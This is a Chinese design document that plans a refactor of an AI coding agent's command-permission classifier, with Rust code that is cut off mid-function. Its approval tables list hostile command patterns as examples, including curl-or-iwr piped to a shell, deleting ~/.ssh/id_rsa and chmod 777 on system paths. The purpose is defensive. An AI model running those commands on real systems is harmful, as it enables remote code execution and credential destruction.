# 智能命令放行（Smart Mode）安全矩阵与沙箱精炼落地重构方案

> **文档标识**：`docs/permission-system-consolidation/independent-plans/05-smart-command-matrix-and-sandbox-plan.md`  
> **报告类型**：架构重构与生产落地独立详案  
> **责任领域**：沙箱语义分类器（`conex-sandbox`）、智能命令放行安全矩阵（`agent-tools::permission`）、执行器阻断点拔除（`agent-tools::shell`、`session-loop::exec_verdict`、`agent-tools::readonly`）  
> **权威遵循**：彻底贯彻用户最高指示——**“不允许打补丁，不允许硬编码，有合理的抽象，适合未来的功能需求，代码尽量简洁，具有优秀的可维护性。需要删除的代码就删除，需要系统性的重构。生成的方案应该能彻底杜绝这些问题或者未来的衍生问题，要求一次性解决掉。尽量减少不必要的兼容，最好是不兼容。”**  
> **基线依赖**：`docs/permission-system-consolidation/analysis/04-command-semantics-and-redline-bypass-analysis.md`

---

## 目录

1. [战役总纲与设计哲学](#一战役总纲与设计哲学)
2. [现状深度审计与历史病灶根因（As-Is 架构诊断）](#二现状深度审计与历史病灶根因as-is-架构诊断)
   - 2.1 混乱脆弱的 7 分类体系及其优先级倒错
   - 2.2 过度工程典型 ①：`CdShape` 与 `TOOL_CD_BLOCKED` 的教条式误伤
   - 2.3 过度工程典型 ②：`polyglot.rs` 1098 行静态正则猫鼠游戏的彻底失败
   - 2.4 刚性越权侵入典型 ③：`readonly.rs` 中 `task_type == "commit"` 硬编码命令白名单
   - 2.5 拦截点散落重叠：多头判定的架构断层
3. [智能命令放行（Smart Mode）双层判定矩阵设计（To-Be 架构）](#三智能命令放行smart-mode双层判定矩阵设计to-be-架构)
   - 3.1 核心哲学：零打扰无感执行 vs 关键节点授权确认
   - 3.2 第一层：无感自动放行（Safe Auto-Allow）全景表
   - 3.3 第二层：敏感需确认（Needs Approval）全景表
   - 3.4 结构化审批原因（`ApprovalReason`）类型抽象与前端赋能
4. [沙箱语义分析器（conex-sandbox）系统性精炼瘦身](#四沙箱语义分析器conex-sandbox系统性精炼瘦身)
   - 4.1 彻底废除 `CdShape`：子进程目录切换完全合法化
   - 4.2 彻底清理 `polyglot.rs`：终结 1098 行正则猜谜死胡同
   - 4.3 全新轻量级智能分类器（`SmartClassifier`）架构设计
   - 4.4 复合命令流水线扁平化与安全解包规范
5. [主干代码解耦：彻底清除 TaskType 硬编码命令白名单](#五主干代码解耦彻底清除-tasktype-硬编码命令白名单)
   - 5.1 拔除 `readonly.rs` 中的硬编码过滤
   - 5.2 拆除 `shell.rs` 与 `exec_verdict.rs` 中的前置锁死
   - 5.3 统一子代理权限模型：平权继承与全局三态对齐
6. [详细代码重构清单（精确到行号与源码蓝图）](#六详细代码重构清单精确到行号与源码蓝图)
   - 6.1 必须彻底删除的代码段与文件清单
   - 6.2 `crates/conex-sandbox/src/smart_classifier.rs` 完整纯 Rust 实现
   - 6.3 `crates/conex-sandbox/src/lib.rs` 精炼重构
   - 6.4 `crates/agent-tools/src/permission.rs` 智能矩阵集成
   - 6.5 `crates/agent-tools/src/tools/shell.rs` 阻断点净化
7. [立体化验证策略与不变量防护（Verification & Invariants）](#七立体化验证策略与不变量防护verification--invariants)
   - 7.1 安全自动放行（Safe Auto-Allow）测试矩阵（60+ 核心命令）
   - 7.2 敏感需确认（Needs Approval）测试矩阵（20+ 高危命令）
   - 7.3 `cd dir && command` 复合链端到端执行验收
   - 7.4 性能与安全断言（ReDoS-free & 零内存泄露）
8. [演进与实施里程碑计划](#八演进与实施里程碑计划)

---

## 一、战役总纲与设计哲学

在 Conex/Crish 系统权限体系重构战役中，用户下达了极其清晰且坚定的最高指令：
> **“不允许打补丁，不允许硬编码，有合理的抽象，适合未来的功能需求，代码尽量简洁，具有优秀的可维护性。需要删除的代码就删除，需要系统性的重构。生成的方案应该能彻底杜绝这些问题或者未来的衍生问题，要求一次性解决掉。尽量减少不必要的兼容，最好是不兼容。”**

全系统的权限模式统一收拢为集中可选的三种清晰形式：
1. **每次询问（AskEveryTime / Ask）**：严格控制，任何写操作及敏感命令逐一由用户弹窗批准；
2. **智能命令放行（SmartCommand / Smart）**：**安全只读、探测环境、本地编译构建、自动化测试、代码检查等常规开发命令无感自动放行；破坏性物理删除、Git 强推与历史重写、系统提权、外链管道执行、包仓库向外发布等高危敏感操作弹窗确认；**
3. **完全允许模式（FullAccess / Full）**：系统不会因为命令而不允许执行，所有执行的命令都是可以运行的，绝对直通执行，零自作主张的阻断。

```mermaid
flowchart TD
    UserCmd["命令行输入 (Shell Command)"] --> ModeChoice{"当前会话权限模式\n(PermissionMode)"}
    
    ModeChoice -- "FullAccess (完全允许)" --> FastPass["⚡ 内核直通执行\n(tokio::process::Command)\n零拦截 / 零篡改 / 零阻断"]
    ModeChoice -- "AskEveryTime (每次询问)" --> AllAsk["⏸️ 全部非纯只读命令弹窗确认\n(走 ApprovalGate 等待用户裁决)"]
    ModeChoice -- "SmartCommand (智能放行)" --> SmartEngine["🧠 智能安全分类器\n(SmartClassifier)"]
    
    SmartEngine --> LayerCheck{"两层判定矩阵"}
    LayerCheck -- "Safe Auto-Allow\n(只读/探测/构建/测试/Lint/安全复合链)" --> AutoExec["✅ 无感自动放行\n(即时执行，不打断思考流)"]
    LayerCheck -- "Needs Approval\n(删除/强推/提权/外链管道/包发布)" --> UserApproval["⏸️ 结构化卡片弹窗\n(附带精准 ApprovalReason,\n等待用户点击允许)"]
```

本详案聚焦于**选项 2——智能命令放行（SmartCommand）**的核心机制与底层沙箱精炼，重构目标为：
- **彻底根除过度工程**：删除 `polyglot.rs` 1098 行静态正则堆砌，删除 `CdShape` 对子进程正常切换目录的死板拦截；
- **彻底拆除硬编码侵入**：从执行主干上拔除 `task_type == "commit"` 等硬编码任务白名单；
- **建立优雅轻量的两层判定模型**：以纯粹、确定性、高可维护性的 Rust 抽象替代脆弱的 7 分类启发式规则，实现“一次性彻底解决，永不回潮”。

---

## 二、现状深度审计与历史病灶根因（As-Is 架构诊断）

### 2.1 混乱脆弱的 7 分类体系及其优先级倒错

在当前 `crates/conex-sandbox/src/semantics.rs:9-27` 中，系统定义了 7 种 `CommandClass`：
```rust
pub enum CommandClass {
    Normal,         // 普通命令（git status / npm test / ls 等）
    Redline,        // 确定性毁灭目标（rm -rf /、mkfs 等），100% 拦截层
    Dangerous,      // 常规危险形态（dd 写设备、curl|bash 等），需审批层
    DeleteShape,    // 删除形态（rm / del / Remove-Item / git rm），走删除接管接口
    GitRevertShape, // git 回退形态（reset --hard / checkout 旧 ref 等），走回退护栏
    Indirect,       // 间接执行（bash -c / eval / sudo 包裹），递归分析内层
    CdShape,        // cd 形态（cd / Set-Location / sl / pushd / popd），禁 cd 语义层
}
```

#### 致命弊端分析：
1. **语义正交性崩塌**：
   - `Indirect`（间接执行）是一种**命令调用载体**，而不是安全风险等级；
   - `DeleteShape` 和 `GitRevertShape` 属于**具体命令领域分类**，不是判定结果；
   - `CdShape` 属于**环境工作目录操作**，根本不是风险分类；
   - 将“载体”、“领域分类”、“目录操作”与真正的风险等级（`Normal`、`Dangerous`、`Redline`）强行揉在一个一维枚举中，导致在复合命令链中必须引入复杂的“优先级决水法”（`semantics.rs:1613-1647`）：
     $$\text{Redline} > \text{Dangerous} > \text{GitRevertShape} > \text{DeleteShape} > \text{CdShape} > \text{Indirect} > \text{Normal}$$
2. **逻辑冲突与死锁**：
   一条安全的命令，只要用 `bash -c` 包裹（如 `bash -c 'ls -la'`），其分类被判定为 `Indirect`，而由于某些调用方粗暴判定 `overall_class != Normal`（如 `readonly.rs:170`），导致连完全无害的间接探测命令都被无辜扼杀。

### 2.2 过度工程典型 ①：`CdShape` 与 `TOOL_CD_BLOCKED` 的教条式误伤

- **代码现场**：
  - `crates/conex-sandbox/src/semantics.rs:24-27, 100-113`
  - `crates/agent-tools/src/tools/shell.rs:314-317`
  - `crates/agent-tools/src/tools/shell_redirect.rs:375-435`
- **教条逻辑**：
  历史战役（T-AB-05）认为：系统执行命令时每次调用独立子进程，单条 `cd` 不会持久化改变宿主或下一个 tool call 的工作目录，复合链 `cd sub && npm test` 内部切换目录“依赖进程内目录状态”，因此系统应“教用户做事”，强行将所有包含 `cd`、`chdir`、`set-location`、`sl`、`pushd`、`popd` 的命令拦截，抛出 `TOOL_CD_BLOCKED`（*“请使用 Cwd 参数指定工作目录，而非 cd 命令”*）。
- **现实破坏性**：
  在真实工程开发中，90% 以上的多包（Monorepo）或复合任务都会写出类似 `cd frontend && npm run build`、`cd crates/conex-sandbox && cargo test` 的命令。子进程生成一个 Shell 环境并在其中进入子目录完成编译，执行完毕后进程销毁，**完全符合操作系统进程语义且天然沙箱隔离**！系统的自作主张拦截彻底摧毁了自动化脚本与开发者的日常习惯。必须**100% 连根拔起**。

### 2.3 过度工程典型 ②：`polyglot.rs` 1098 行静态正则猫鼠游戏的彻底失败

- **代码现场**：`crates/conex-sandbox/src/polyglot.rs`（共 1098 行，配置 35+ 个重量级正则）
- **妄图实现的目标**：
  静态检测 `python -c`、`node -e`、`ruby -e`、`perl -e`、`php -r` 等内联代码中是否使用了危险函数（如 `os.system`、`shutil.rmtree`、`child_process.execSync`、`fs.rmSync` 等），甚至尝试用正则识别“反射调用”（`py_reflection_danger`、`node_reflection_danger`）。
- **失败根因与巨大隐患**：
  1. **理论不可能**：用有限正则不可能准确解析图灵完备的动态语言 AST。面对简单的字符串拼接（如 `getattr(os, "sys" + "tem")` 或 `eval(Buffer.from(...))`），静态正则瞬间失效；
  2. **严重误伤合法测试**：开发者在内联测试脚本中经常运行 `python -c "import os; print(os.name)"` 或 `node -e "console.log(process.platform)"`，极易误触所谓的“危险模块正则”；
  3. **极端连锁死锁**：在 `semantics.rs:1188-1200` 中，一旦 `polyglot` 内部正则编译失败，甚至执行 **fail-closed 物理红线阻断（`redline_only_analysis`）**；若被猜中内部有删除，直接打上 `has_indirect_delete = true`，导致后续命令在 `shell_redirect.rs:71-84` 遭遇整链死刑拦截！
  4. **性能拖累**：35+ 个复杂正则在每次命令传入时反复扫描，带来不必要的 CPU 消耗和潜在 ReDoS 隐患。必须**整文件彻底删除**。

### 2.4 刚性越权侵入典型 ③：`readonly.rs` 中 `task_type == "commit"` 硬编码命令白名单

- **代码现场**：
  - `crates/agent-tools/src/readonly.rs:158-183`
  - `crates/agent-tools/src/tools/shell.rs:239-256`
  - `crates/session-loop/src/exec_verdict.rs:131-136`
- **代码罪证**：
  ```rust
  // crates/agent-tools/src/readonly.rs:158-183
  pub fn command_allowed_for_task_type(task_type: &str, command_line: &str) -> bool {
      let cmd = command_line.trim();
      match task_type {
          "commit" => first_token(cmd) == "git",
          "implementation" => {
              // 语义层必须为 Normal，且门禁必须为 Allowed
              let analysis = analyze(cmd);
              if analysis.overall_class != CommandClass::Normal { return false; }
              matches!(SHARED_GATEKEEPER.check_command_with_analysis(...), GatekeeperResult::Allowed)
          }
          _ => false, // 👈 只要 task_type 不是 commit/implementation，其他一律硬阻断！
      }
  }
  ```
- **破坏性后果**：
  1. **职责倒错**：`task_type` 只是调度框架或提示词维度的业务标签（如 `analysis`, `review`, `commit`），权限系统的唯一真源应该是用户设定的 `PermissionMode`。硬编码白名单让业务元数据越俎代庖，凌驾于系统权限矩阵之上；
  2. **死锁悲剧**：当主 Agent 派发子代理负责 `commit` 任务时，子代理在提交前往往需要先执行 `cargo check` 确保编译正常、或 `npm run lint` 确保格式无误，但因为首词不是 `git`，被系统在 `shell.rs:249` 毫不留情地以 `TOOL_COMMAND_BLOCKED` 处决！必须**彻底清理**。

### 2.5 拦截点散落重叠：多头判定的架构断层

当前执行一条命令，要经历多达 5~7 处私设公堂的层层卡扣：
```
SessionLoop(call_verdict) 
  └─> task_type 白名单 (readonly.rs)
  └─> SHARED_GATEKEEPER (conex-sandbox::lib)
  └─> RevertPolicy (revert.rs)
  └─> ShellTool::prepare (shell.rs)
        └─> task_type 二次检查 (shell.rs:241)
        └─> SHARED_GATEKEEPER 二次检查 (shell.rs:258)
        └─> DeleteShape 重定向与硬拦截 (shell_redirect.rs:54)
        └─> CdShape 硬拦截 (shell_redirect.rs:378)
        └─> CommandPathInspector 绝对路径围栏 (shell.rs:320)
        └─> decide_analysis_with_revert 三次检查 (shell.rs:336)
```
每一层都在“自作主张”地丢出不同错误码（`TOOL_COMMAND_BLOCKED`、`TOOL_CD_BLOCKED`、`tool.requires_approval`）。架构治理必须实现**单点归一裁决**。

---

## 三、智能命令放行（Smart Mode）双层判定矩阵设计（To-Be 架构）

### 3.1 核心哲学：零打扰无感执行 vs 关键节点授权确认

智能命令放行（Smart Mode）的灵魂在于：**精准识别开发者的工作流意图**。
- **开发与探索工作流**（查看状态、查找代码、编译依赖、跑测试套件、代码检查）是完全幂等或在工作区内可控的操作，应当**零打扰即时放行（Safe Auto-Allow）**；
- **具有破坏性、外泄性或历史抹除性质的操作**（删除文件、重写 Git 历史、外连下载二进制管道、系统提权、发布到共有镜像源），应当**主动暂停并向用户展示清晰卡片，征求同意（Needs Approval）**。

彻底废除复杂的 7 分类，重构为高度正交、确定性的**双层判定模型**：

```rust
/// 智能命令裁决结果
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum SmartVerdict {
    /// 第一层：安全命令，无感自动放行
    SafeAutoAllow,
    /// 第二层：敏感命令，需弹窗审批（携带精准原因）
    NeedsApproval(ApprovalReason),
}
```

---

### 3.2 第一层：无感自动放行（Safe Auto-Allow）全景表

命中以下任意维度的命令段，且未包含第二层敏感特征的，判定为 `SafeAutoAllow`，内核直接进入子进程执行：

| 领域分类 | 涵盖核心命令族 / 格式 | 典型示例 | 判定标准与安全说明 |
| :--- | :--- | :--- | :--- |
| **只读与系统探测** | `ls`, `dir`, `cat`, `head`, `tail`, `less`, `more`, `grep`, `rg`, `find`, `findstr`, `which`, `where`, `pwd`, `file`, `wc`, `stat`, `diff`, `echo`, `printf`, `type` | `ls -la src/`<br>`rg "fn main" crates/`<br>`pwd`<br>`echo "test"` | 纯读操作，零磁盘状态修改，属于最基本的环境感知。 |
| **版本控制只读状态** | `git status`, `git diff`, `git log`, `git branch`, `git show`, `git rev-parse`, `git remote`, `git tag`, `git check-ignore`, `git ls-files` | `git status -s`<br>`git diff HEAD~1`<br>`git log -n 5 --oneline` | 仅读取 Git 仓库元数据与变更差异，不修改暂存区或工作区。 |
| **本地构建与语法检查** | `cargo check`, `cargo build`, `cargo clippy`, `npm run build`, `npm run check`, `tsc`, `go build`, `mvn compile`, `gradle build`, `make`, `cmake --build` | `cargo check --workspace`<br>`npm run build`<br>`tsc --noEmit` | 本地项目产物编译构建与静态检查，副作用限于 `target/`、`dist/` 等构建缓存。 |
| **自动化测试套件** | `cargo test`, `npm test`, `npm run test`, `npx vitest`, `npx jest`, `pytest`, `python -m unittest`, `go test`, `mvn test`, `gradle test`, `ctest` | `cargo test -p conex-sandbox`<br>`npm test -- tests/unit`<br>`pytest tests/` | 开发者验证代码逻辑的核心手段，必须保障流水线丝滑运转。 |
| **Linter 与格式化检查** | `eslint`, `prettier --check`, `cargo fmt --check`, `ruff check`, `black --check`, `mypy`, `flake8`, `golangci-lint` | `cargo fmt -- --check`<br>`npx eslint .`<br>`ruff check .` | 代码规范检查，属于幂等的静态代码分析。 |
| **安全子进程目录切换** | `cd <dir>`, `pushd <dir>`, `popd`（包含在复合链中） | `cd frontend && npm test`<br>`cd crates/agent-tools; cargo test` | **完全合法放行**。子进程退出后环境自动销毁，零宿主污染。 |

---

### 3.3 第二层：敏感需确认（Needs Approval）全景表

命中以下任意特征的命令，系统**严禁擅自阻断**，而是**捕获关键语义，构造精准的 `ApprovalReason` 结构体，进入审批流，在 UI 上弹窗提请用户裁决**：

| 敏感类型标识 | 匹配语法模式 / 核心命令特征 | 典型高危示例 | 风险根因与审批理由 |
| :--- | :--- | :--- | :--- |
| **`DestructiveDelete`**<br>(破坏性物理删除) | `rm`, `del`, `erase`, `rmdir`, `rd`, `Remove-Item`, `git clean -fd`, `git clean -f`, `git rm` | `rm -rf target/`<br>`git clean -fdx`<br>`del /f /q temp.txt` | 物理清除工作区文件或目录，若误删可能造成未入库代码永久丢失。 |
| **`GitHistoryRewrite`**<br>(仓库历史重写与强推) | `git push ... --force`, `git push ... -f`, `git reset --hard`, `git restore .`, `git checkout -- .` | `git push origin main -f`<br>`git reset --hard HEAD~3`<br>`git checkout .` | 强行重写 Git 提交图或丢弃所有未提交工作区修改，具有不可逆性。 |
| **`PrivilegeEscalation`**<br>(系统提权与权限修改) | `sudo`, `runas`, `su`, `chmod 777`, `chown`, `Set-ExecutionPolicy`, 敏感注册表修改 | `sudo apt-get install`<br>`runas /user:admin cmd`<br>`chmod -R 777 /var` | 尝试突破普通用户沙箱，获取操作系统最高控制权。 |
| **`RemotePipeExecution`**<br>(外链下载管道执行) | `curl ... \| bash`, `curl ... \| sh`, `wget ... \| sh`, `Invoke-WebRequest ... \| iex` | `curl -fsSL https://... \| bash`<br>`iwr -useb ... \| iex` | 从外部不可控公网下载脚本并直接送入解释器执行，极易遭受供应链投毒。 |
| **`PackagePublish`**<br>(向外公开分发包) | `npm publish`, `cargo publish`, `twine upload`, `gem push` | `npm publish --access public`<br>`cargo publish` | 向公开镜像源（crates.io、npm）发布包，一旦发布无法撤销，防误发防泄密。 |
| **`WorkspaceEscape`**<br>(工作区外部破坏性操作) | 目标路径包含 `..` 逃逸，或指向系统敏感目录（`C:/Windows`, `/etc`, `~/.ssh`, `~/.aws` 等）且具有写/删行为 | `rm -f ~/.ssh/id_rsa`<br>`mv file /etc/hosts` | 意图越出当前工作区修改主机敏感配置。 |

---

### 3.4 结构化审批原因（`ApprovalReason`）类型抽象与前端赋能

为了彻底杜绝以前只返回一个冷冰冰的错误码（如 `tool.requires_approval`）而导致用户不知所以的糟糕体验，系统将判定出的敏感特征封装为富结构体：

```rust
/// 敏感操作需审批的结构化详情（供前端审批卡片精准展示）
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(tag = "category", content = "details")]
pub enum ApprovalReason {
    /// 破坏性删除
    DestructiveDelete {
        targets: Vec<String>,
        is_recursive: bool,
    },
    /// Git 历史重写或强推
    GitHistoryRewrite {
        operation: String,
        target_ref: Option<String>,
    },
    /// 系统提权
    PrivilegeEscalation {
        command: String,
    },
    /// 远程外链管道执行
    RemotePipeExecution {
        url: Option<String>,
        interpreter: String,
    },
    /// 向外公开分发包
    PackagePublish {
        registry: String,
        package_name: Option<String>,
    },
    /// 工作区外部敏感目录越界操作
    WorkspaceEscape {
        target_path: String,
        is_write: bool,
    },
    /// 包含不确定副作用的常规写操作
    UnsafeSideEffect {
        command: String,
    },
}
```

#### 前端交互赋能：
当 Smart Mode 判定为 `NeedsApproval(reason)` 时：
1. 后端不抛出阻断异常，而是通过 `ApprovalGate` 挂起任务，向前端发射 `tool-approval-required` 事件；
2. 事件携带完整的 `reason` JSON 载荷；
3. 前端根据 `category` 渲染高度定制的卡片：
   - 遇到 `DestructiveDelete`：高亮显示标红的待删路径列表，并提示 *“是否确认永久删除以下路径？”*；
   - 遇到 `GitHistoryRewrite`：警告 *“检测到重写 Git 历史操作，可能覆盖远程分支或丢失未暂存工作！”*；
   - 遇到 `PackagePublish`：确认 *“检测到发布包操作，即将向公共仓库推送版本，是否授权？”*。
用户点击“允许”后，命令即可直接执行；点击“拒绝”，优雅返回用户拒绝说明。

---

## 四、沙箱语义分析器（conex-sandbox）系统性精炼瘦身

### 4.1 彻底废除 `CdShape`：子进程目录切换完全合法化

- **架构裁决**：
  在现代操作系统中，每个进程拥有独立的虚拟地址空间和当前工作目录（CWD）。Shell 工具通过 `tokio::process::Command` 启动的子 Shell 进程中，`cd sub && cargo test` 仅在该独立子进程生存期内起效。
- **重构举措**：
  1. 彻底从枚举 `CommandClass`（或重构后的 `SmartVerdict`）中删除 `CdShape`；
  2. 彻底删除 `CD_COMMANDS` 静态常量表；
  3. 彻底删除 `shell_redirect.rs:375-435` 中的 `intercept_cd_shape` 函数；
  4. 彻底删除 `shell.rs:314-317` 的 CD 拦截分支；
  5. 废除 `TOOL_CD_BLOCKED` 错误常量；
  6. 允许任何包含 `cd` 的复合命令安全顺畅地进入 Shell 子进程执行。

---

### 4.2 彻底清理 `polyglot.rs`：终结 1098 行正则猜谜死胡同

- **架构裁决**：
  放弃在静态字符串层用正则表达式去对多语言（Python, Node, Ruby, Perl, PHP）的内联脚本做 AST 深度语义分析的脆弱尝试。
- **重构举措**：
  1. **彻底物理删除 `crates/conex-sandbox/src/polyglot.rs`（共 1098 行代码）**；
  2. 在 `crates/conex-sandbox/src/lib.rs` 中移除 `pub mod polyglot;` 及所有相关导出；
  3. **扁平化包裹提取规范**：
     - 对于 `bash -c "cmd"`、`sh -c "cmd"`、`pwsh -Command "cmd"` 等 Shell 解释器包裹，仅做标准的字符串引号剥离（Unquote），提取出内部的 `cmd`，复用统一的命令分类器进行审查；
     - 对于 PowerShell 的 `-EncodedCommand <base64>`，仅保留轻量的标准 Base64 UTF-16LE 解码（约 20 行纯 Rust 代码），将其解码为明文字符串后同样复用统一分类器，**绝不引入多语言正则匹配**。

---

### 4.3 全新轻量级智能分类器（`SmartClassifier`）架构设计

重构后的分类器聚焦于**高速、高确定性、零 ReDoS、零外部正则依赖**的纯函数算法。核心架构分为三步：

```mermaid
flowchart LR
    RawCmd["原始命令行 (cmd)"] --> Unpack["1. 解包与规范化\n(剥离外层解释器/Base64解码)"]
    Unpack --> Split["2. 流水线切分 (Pipelines)\n(&&, ;, ||, |)"]
    Split --> Match["3. 双层规则匹配\n(查第一层白名单 / 查第二层敏感特征)"]
    Match --> Verdict["输出 SmartVerdict\n(SafeAutoAllow / NeedsApproval)"]
```

1. **词法快速分段（Segment Tokenizer）**：
   - 尊重单双引号与转义符，识别命令连接符 `&&`、`;`、`||` 以及管道 `|`；
   - 提取复合命令中的各个独立执行段（Segments）。
2. **段首词与子命令规范化（Normalizer）**：
   - 剥离路径前缀（如 `/usr/bin/git` $\rightarrow$ `git`，`C:\Windows\System32\cmd.exe` $\rightarrow$ `cmd`）；
   - 统一转为小写；
   - 提取主命令（Command）与一级子命令（Subcommand，如 `git status` 提取 `status`，`npm test` 提取 `test`）。
3. **两层决策（Fast Decision）**：
   - **优先扫描高危特征**：若任何一段命中删除（`rm`, `del`）、Git 强推（`push -f`, `reset --hard`）、外链管道（`curl ... | bash`）、提权（`sudo`）或发布（`publish`），立即返回 `NeedsApproval(reason)`；
   - **次选放行安全特征**：若所有段均属于只读、构建、测试、代码检查白名单，返回 `SafeAutoAllow`；
   - **兜底策略**：未知或带有不确定副作用的命令，在 Smart 模式下安全回落为 `NeedsApproval(UnsafeSideEffect)`，保障资产安全。

---

## 五、主干代码解耦：彻底清除 TaskType 硬编码命令白名单

### 5.1 拔除 `readonly.rs` 中的硬编码过滤

- **删除目标**：
  - `crates/agent-tools/src/readonly.rs:158-183`：
    彻底删除 `pub fn command_allowed_for_task_type(task_type: &str, command_line: &str) -> bool`；
  - `crates/agent-tools/src/readonly.rs:456-537`：
    彻底删除针对 `command_allowed_for_task_type` 的全部单测。
- **架构意义**：
  `readonly.rs` 仅负责只读工具注册表定义（如只读上下文下的文件读取等工具清单过滤），严禁把手伸向动态命令行执行逻辑，严禁根据任务名称剥夺合法的构建与 Git 状态检查操作。

### 5.2 拆除 `shell.rs` 与 `exec_verdict.rs` 中的前置锁死

1. **`crates/agent-tools/src/tools/shell.rs:239-256`**：
   ```rust
   // 彻底删除以下硬编码拦截块：
   // if let Some(task_type) = &ctx.task_type {
   //     if !crate::readonly::command_allowed_for_task_type(task_type, &command) { ... }
   // }
   ```
2. **`crates/session-loop/src/exec_verdict.rs:131-136`**：
   ```rust
   // 彻底删除调度前置门禁拦截：
   // if let Some(task_type) = &options.task_type {
   //     if !agent_tools::readonly::command_allowed_for_task_type(task_type, command) { ... }
   // }
   ```

### 5.3 统一子代理权限模型：平权继承与全局三态对齐

- 子代理派发时，其 `permission_mode` 不再硬编码为 `None` 或受 `task_type` 歧视；
- 子代理天然继承父级会话的权限模式：
  - 若用户在当前会话配置了 `Smart` 模式，子代理执行 `git status`、`cargo check`、`npm test` 自动享受无感放行；
  - 若子代理触发 `rm -rf`，同样通过全局统一的 `ApprovalGate` 弹窗向用户请求审批；
- 架构全面实现单一真源（SSOT）。

---

## 六、详细代码重构清单（精确到行号与源码蓝图）

### 6.1 必须彻底删除的代码段与文件清单

| 序号 | 所在模块 / 文件路径 | 对应行号范围 | 删除原因与重构动作 |
| :---: | :--- | :--- | :--- |
| **D-01** | `crates/conex-sandbox/src/polyglot.rs` | **1–1098 行**（整文件） | **彻底删除整文件**。终结 35+ 个脆弱正则构成的静态多语言内联代码猜谜逻辑。 |
| **D-02** | `crates/conex-sandbox/src/lib.rs` | `1-9 行` | 移除 `pub mod polyglot;` 声明及 `PolyglotCodeInspector` 等无用导出。 |
| **D-03** | `crates/conex-sandbox/src/semantics.rs` | `24–27 行` | 移除 `CommandClass::CdShape` 枚举项。 |
| **D-04** | `crates/conex-sandbox/src/semantics.rs` | `100–113 行` | 移除 `CD_COMMANDS` 静态数组定义。 |
| **D-05** | `crates/conex-sandbox/src/semantics.rs` | `181–191 行` | 移除 `cd_shape_analysis()` 构造函数。 |
| **D-06** | `crates/conex-sandbox/src/semantics.rs` | `1163–1201 行` | 移除对 `polyglot::PolyglotCodeInspector` 的调用分支与 fail-closed 拦截。 |
| **D-07** | `crates/conex-sandbox/tests/cd_shape.rs` | **1–180 行**（整文件） | 移除反向强制阻断 cd 的旧测试，重写为复合命令与安全放行测试。 |
| **D-08** | `crates/agent-tools/src/readonly.rs` | `158–199 行` | 彻底删除 `command_allowed_for_task_type` 及其 `first_token` 辅助函数。 |
| **D-09** | `crates/agent-tools/src/readonly.rs` | `456–537 行` | 删除针对任务类型白名单的单元测试。 |
| **D-10** | `crates/agent-tools/src/tools/shell.rs` | `239–256 行` | 彻底删除 TaskType 白名单阻断逻辑。 |
| **D-11** | `crates/agent-tools/src/tools/shell.rs` | `314–317 行` | 彻底删除 `intercept_cd_shape` 阻断调用分支。 |
| **D-12** | `crates/agent-tools/src/tools/shell_redirect.rs` | `375–435 行` | 彻底删除 `intercept_cd_shape` 函数全文。 |
| **D-13** | `crates/session-loop/src/exec_verdict.rs` | `131–136 行` | 彻底删除 `call_verdict` 中的 `command_allowed_for_task_type` 阻断代码。 |
| **D-14** | `crates/agent-tools/src/tools/shell_tests/security_policy.rs` | `90–160 行` | 移除关于 `TOOL_CD_BLOCKED` 的断言用例，更新为放行用例。 |

---

### 6.2 `crates/conex-sandbox/src/smart_classifier.rs` 完整纯 Rust 实现

在 `crates/conex-sandbox/src/` 中新增独立模块 `smart_classifier.rs`，作为智能放行判定矩阵的核心生产实现：

```rust
//! 智能命令放行分类器（SmartClassifier）
//!
//! 纯函数、零复杂 AST 正则遍历、高确定性的两层智能判定架构：
//! 1. SafeAutoAllow：只读探测、版本控制状态、构建/测试/语法检查、Lint等无感自动放行；
//! 2. NeedsApproval：破坏性删除、强推/历史重写、系统提权、外链管道执行、包发布等弹窗确认。

use serde::{Deserialize, Serialize};

/// 审批原因详细分类载荷
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "category", content = "details")]
pub enum ApprovalReason {
    /// 破坏性删除（rm, del, rmdir, Remove-Item 等）
    DestructiveDelete {
        targets: Vec<String>,
    },
    /// Git 历史重写或强推（git push -f, git reset --hard 等）
    GitHistoryRewrite {
        operation: String,
    },
    /// 系统提权（sudo, runas 等）
    PrivilegeEscalation {
        command: String,
    },
    /// 远程外链管道执行（curl | bash 等）
    RemotePipeExecution {
        pipeline: String,
    },
    /// 向外公开分发包（npm publish, cargo publish 等）
    PackagePublish {
        registry: String,
    },
    /// 包含不确定写操作副作用的通用命令
    UnsafeSideEffect {
        command: String,
    },
}

/// 智能放行判定裁决
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SmartVerdict {
    /// 第一层：安全无感自动放行
    SafeAutoAllow,
    /// 第二层：敏感需弹窗确认
    NeedsApproval(ApprovalReason),
}

/// 单个命令段
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandSegment {
    pub raw: String,
    pub command: String,
    pub args: Vec<String>,
}

pub struct SmartClassifier;

impl SmartClassifier {
    /// 核心入口：判定任意命令行的智能放行裁决
    pub fn classify(command_line: &str) -> SmartVerdict {
        let trimmed = command_line.trim();
        if trimmed.is_empty() {
            return SmartVerdict::SafeAutoAllow;
        }

        // 1. 检查是否存在远程管道执行高危形态 (如 curl ... | bash, wget ... | sh)
        if Self::is_remote_pipe_execution(trimmed) {
            return SmartVerdict::NeedsApproval(ApprovalReason::RemotePipeExecution {
                pipeline: trimmed.to_string(),
            });
        }

        // 2. 切分复合命令段 (&&, ;, ||, |)
        let segments = Self::split_segments(trimmed);
        if segments.is_empty() {
            return SmartVerdict::SafeAutoAllow;
        }

        // 3. 逐段分析：任一段命中高危敏感操作，整链升级为 NeedsApproval
        for seg in &segments {
            if let Some(reason) = Self::inspect_segment_danger(seg) {
                return SmartVerdict::NeedsApproval(reason);
            }
        }

        // 4. 逐段分析：若所有段都属于安全白名单或安全环境操作，则放行
        let all_safe = segments.iter().all(Self::is_segment_safe);
        if all_safe {
            SmartVerdict::SafeAutoAllow
        } else {
            // 未知具有写副作用的常规命令，在 Smart 模式下安全回落为询问
            SmartVerdict::NeedsApproval(ApprovalReason::UnsafeSideEffect {
                command: trimmed.to_string(),
            })
        }
    }

    /// 识别 `curl ... | bash` 等下载直接进 Shell 的危险管道
    fn is_remote_pipe_execution(cmd: &str) -> bool {
        let lower = cmd.to_ascii_lowercase();
        if !lower.contains('|') {
            return false;
        }
